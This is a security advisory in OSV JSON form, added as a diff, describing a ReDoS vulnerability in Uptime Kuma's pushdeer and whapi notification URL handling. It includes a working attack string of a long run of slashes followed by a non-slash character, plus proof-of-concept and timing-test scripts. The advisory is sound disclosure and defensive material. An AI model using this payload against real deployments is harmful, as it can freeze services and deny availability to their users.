@@ -1,0 +1,51 @@
+{
+  "modified": "2025-03-29T00:18:45Z",
+  "published": "2025-03-29T00:18:45Z",
+  "schema_version": "1.5.0",
+  "id": "GHSA-hx7h-9vf7-5xhg",
+  "details": "### Summary\r\nThere is a `ReDoS vulnerability risk` in the system, specifically when administrators create `notification` through the web service(`pushdeer` and `whapi`). If a string is provided that triggers catastrophic backtracking in the regular expression, it may lead to a ReDoS attack.\r\n\r\n### Details\r\nThe regular expression` \\/*$\\` is used to match zero or more slashes `/` at the end of a URL. When a malicious attack string appends a large number of slashes `/` and a non-slash character at the end of the URL, the regular expression enters a backtracking matching process. During this process, the regular expression engine starts checking each slash from the first one, continuing until it encounters the last non-slash character. Due to the greedy matching nature of the regular expression, this process repeats itself, with each backtrack checking the next slash until the last slash is checked. This backtracking process consumes significant CPU resources.\r\n```js\r\n.replace(/\\/*$/, \"\")\r\n```\r\nFor the regular expression `/\\/*$/`, an attack string like \r\n```javascript\r\n\"https://e\" + \"/\".repeat(100000) + \"@\" \r\n```\r\ncan trigger catastrophic backtracking, causing the web service to freeze and potentially leading to a ReDoS attack.\r\n\u003e When entered from the web interface, the attack string needs to expand `\"/\".repeat(100000)` and be input directly, such as `https://e/////////..//@`. This triggers catastrophic backtracking, leading to web service lag and posing a potential ReDoS attack risk.\r\n\r\n### PoC\r\nThe poc.js is in: \r\nhttps://gist.github.com/ShiyuBanzhou/26c918f93b07f5ce90e8f7000d29c7a0\r\nThe time lag phenomenon can be observed through test-pushdeer-ReDos, which helps verify the presence of the ReDoS attack:\r\n```javascript\r\nconst semver = require(\"semver\");\r\nlet test;\r\nconst nodeVersion = process.versions.node;\r\nif (semver.satisfies(nodeVersion, \"\u003e= 18\")) {\r\n    test = require(\"node:test\");\r\n} else {\r\n    test = require(\"test\");\r\n}\r\nconst PushDeer = require(\"../../server/notification-providers/pushdeer.js\");\r\n\r\nconst assert = require(\"node:assert\");\r\n\r\ntest(\"Test ReDos - attack string\", async (t) =\u003e {\r\n    const pushDeer = new PushDeer();\r\n    const notification = {\r\n        pushdeerServer: \"https://e\" + \"/\".repeat(100000) + \"@\",\r\n    };\r\n    const msg = \"Test Attacking\";\r\n    const startTime = performance.now();\r\n    try {\r\n        pushDeer.send(notification, msg)\r\n    } catch (error) {\r\n    // pass\r\n    }\r\n    const endTime = performance.now();\r\n    const elapsedTime = endTime - startTime;\r\n    const reDosThreshold = 2000;\r\n    assert(elapsedTime \u003c= reDosThreshold, `🚨 Potential ReDoS Attack! send method took ${elapsedTime.toFixed(2)} ms, exceeding threshold of ${reDosThreshold} ms.`);\r\n});\r\n```\r\n\u003e Move the `test-uptime-calculator.js` file to the `./uptime-kuma/test/backend-test` folder and run `npm run test-backend` to execute the backend tests.\r\n\r\nTrigger conditions for whapi jams, In the send function within the `uptime-kuma\\server\\notification-providers\\pushdeer.js` file:\r\nhttps://gist.github.com/ShiyuBanzhou/bf4cee61603e152c114fa8c4791f9f28\r\n```js\r\n// The attack string \"httpS://example\" + \"/\".repeat(100000) + \"@\"\r\n// poc.js\r\n// Import the target file\r\nconst Whapi = require(\"./uptime-kuma/server/notification-providers/whapi\");\r\n\r\n// Create an instance of Whapi\r\nconst whapi = new Whapi();\r\n\r\nconst notification = {\r\n    whapiApiUrl: \"https://e\" + \"/\".repeat(100000) + \"@\",\r\n};\r\n// console.log(`${notification.whapiApiUrl}`);\r\n// Define the message to be sent\r\nconst msg = \"Test Attacking\";\r\n\r\n// Call the send method and handle exceptions\r\nwhapi.send(notification, msg)\r\n\r\n// 1-5 are the original installation methods for the project\r\n// 6-8 are attack methods\r\n// ---\r\n// 1.run `git clone https://github.com/louislam/uptime-kuma.git`\r\n// 2.run `cd uptime-kuma`\r\n// 3.run `npm run setup`\r\n// 4.run `npm install pm2 -g \u0026\u0026 pm2 install pm2-logrotate`\r\n// 5.run `pm2 start server/server.js --name uptime-kuma`\r\n// ---\r\n// 6.Run npm install in the root directory of the same level as `README.md`\r\n// 7.Move `poc.js` to the root directory of the same level as `README.md`\r\n// 8.and then run `node poc.js`\r\n```\r\n\r\nAfter running, a noticeable lag can be observed, with the regular expression matching time increasing from a few milliseconds to over 2000 milliseconds.\r\n\u003cimg width=\"760\" alt=\"redos\" src=\"https://github.com/user-attachments/assets/98f18fee-7555-410e-98c8-763906843812\" /\u003e\r\n\r\nYou can also perform this attack on the web interface. By timing the operation, it can be observed that the lag still occurs. The key to the attack string is appending a large number of `/` to the URL, followed by a `non-/` character at the end, entered directly.\r\n\r\n\u003cimg width=\"1280\" alt=\"1\" src=\"https://github.com/user-attachments/assets/61945200-4397-4933-9170-2a5517613408\" /\u003e\r\n\u003cimg width=\"1280\" alt=\"webserver\" src=\"https://github.com/user-attachments/assets/c0d7e952-0ec1-4c54-ba31-8b7144c04669\" /\u003e\r\n\r\n### Impact\r\n**What kind of vulnerability is it?**\r\n\r\nThis is a `Regular Expression Denial of Service (ReDoS)` vulnerability. ReDoS exploits poorly designed regular expressions that can lead to excessive backtracking under certain input conditions, causing the affected application to consume high CPU and memory resources. This can result in `significant performance degradation or complete service unavailability`, especially when processing specially crafted attack strings.\r\n\r\n**Who is impacted?**\r\n1. **Uptime Kuma users**:\r\nAny users or administrators running the Uptime Kuma project are potentially affected, especially if they allow untrusted input through the web interface or notification services like `pushdeer.js` and `whapi.js`. Attackers can exploit this vulnerability by injecting crafted strings into the input fields.\r\n\r\n2. **Web services and hosting providers**:\r\nIf Uptime Kuma is deployed in a production environment, the vulnerability could impact hosting providers or servers running the application, leading to `downtime`, `degraded performance`, or `resource exhaustion`.\r\n\r\n### Solution\r\n@louislam I have provided a solution for you to check:https://github.com/louislam/uptime-kuma/pull/5573\r\n",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "DHI",
+        "name": "uptime-kuma",
+        "purl": "pkg:dhi/uptime-kuma"
+      },
+      "database_specific": {
+        "range_status": "error parsing vulnerable versions: error sanitizing version: invalid version: \u0026\u0026.0",
+        "source_ecosystem": "",
+        "source_package": "uptime-kuma"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "DHI",
+        "name": "uptime-kuma",
+        "purl": "pkg:dhi/uptime-kuma"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "2.0.0-beta.0"
+            },
+            {
+              "fixed": "2.0.0-beta.2"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source_ecosystem": "",
+        "source_package": "uptime-kuma"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/louislam/uptime-kuma/security/advisories/GHSA-hx7h-9vf7-5xhg"
+    }
+  ]
+}
